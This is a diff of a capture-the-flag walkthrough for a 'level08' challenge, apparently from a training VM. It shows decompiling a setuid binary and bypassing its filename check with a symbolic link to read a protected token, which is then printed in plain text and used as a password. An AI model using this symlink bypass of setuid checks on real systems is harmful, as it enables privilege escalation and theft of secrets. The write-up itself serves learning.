@@ -13,12 +13,23 @@
 	.bash_logout  .bashrc  .profile  level08  token
 	```
 
-3. __Action__ (Guest): check the file access control list of both `level08` and `token` files
+3. __Action__ (Guest): check the type of the `level08` file
+	```sh
+	file -b level08
+	```
+
+4. __Observation__ (Guest): the previous command reveals that the `level08` file
+	is an ELF 32-bits executable
+	```
+	setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped
+	```
+
+5. __Action__ (Guest): check the file access control list of both `level08` and `token` files
 	```sh
 	getfacl level08 token
 	```
 
-4. __Observation__ (Guest): the previous command reveals that:
+6. __Observation__ (Guest): the previous command reveals that:
 	- the `level08` file:
 		- is readable by the `level08` group
 		- is executable by the `level08` group
@@ -48,16 +59,16 @@
 	other::---
 	```
 
-5. __Action__ (Host): copy the `level08` file from the virtual machine
+7. __Action__ (Host): copy the `level08` file from the virtual machine
 	```sh
 	sshpass -f level07/flag 2>/dev/null \
-		scp -P 4242 level08@192.168.122.214:level08 level08
+		scp -P 4242 level08@192.168.122.214:level08 /tmp
 	```
 
-5. __Action__ (Host): decompile the `level08` file using [dogbolt](https://dogbolt.org/)
+8. __Action__ (Host): decompile the `level08` file using [dogbolt](https://dogbolt.org/)
 	and manually improve the lisibility of the decompiled code
 
-6. __Observation__ (Host): after reverse engineering the `level08` file, we obtain the following
+9. __Observation__ (Host): after reverse engineering the `level08` file, we obtain the following
 	C code, which takes a filename as an argument, reads the content of the file
 	and writes it to the standard output. The thing is that it checks if the filename
 	contains the string `token`, and if it does, it prints an error message and exits.
@@ -93,7 +104,12 @@
 	}
 	```
 
-7. __Action__ (Host): reminding that the `level05` had a special directory
+10. __Action__ (Host): remove the `level08` file
+	```sh
+	rm /tmp/level08
+	```
+
+11. __Action__ (Host): reminding that the `level05` had a special directory
 	named `openarenaserver` in the `/opt` directory,  
 	in which the `level05` user had all the permissions (read, write, and execute),  
 	create the symbolic link named `.bypass` in this directory as the `level05` user
@@ -103,7 +119,7 @@
 			ln -s /home/user/level08/token /opt/openarenaserver/.bypass
 	```
 
-8. __Action__ (Guest): check that the `.bypass` symbolic link has been correctly created
+12. __Action__ (Guest): check that the `.bypass` symbolic link has been correctly created
 	and points to the `token` file
 	```sh
 	[ -L /opt/openarenaserver/.bypass ] \
@@ -113,28 +129,28 @@
 	echo 'Symbolic link exists and points to the right file'
 	```
 
-9. __Observation__ (Guest): the following message appears on stdout:  
+13. __Observation__ (Guest): the following message appears on stdout:  
 	`Symbolic link exists and points to the right file`  
 	confirming that the `.bypass` symbolic link has been correctly created
 	and points to the `token` file
 
-10. __Action__ (Guest): execute the `level08` file with the `.bypass` symbolic link
+14. __Action__ (Guest): execute the `level08` file with the `.bypass` symbolic link
 	as the first argument
 	```sh
 	./level08 /opt/openarenaserver/.bypass
 	```
 
-11. __Observation__ (Guest): as expected, the check on the filename is bypassed,  
+15. __Observation__ (Guest): as expected, the check on the filename is bypassed,  
 	and the content of the `token` file appears on stdout: `quif5eloekouj29ke0vouxean`
 
-12. __Action__ (Host): remove the `.bypass` symbolic link
+16. __Action__ (Host): remove the `.bypass` symbolic link
 	```sh
 	sshpass -f level04/flag 2>/dev/null \
 		ssh -p 4242 level05@192.168.122.214 \
 			rm /opt/openarenaserver/.bypass
 	```
 
-13. __Action__ (Host): run the `getflag` command as the `flag08` user
+17. __Action__ (Host): run the `getflag` command as the `flag08` user
 	and save the token in the `flag` file
 	```sh
 	sshpass -p quif5eloekouj29ke0vouxean 2>/dev/null \
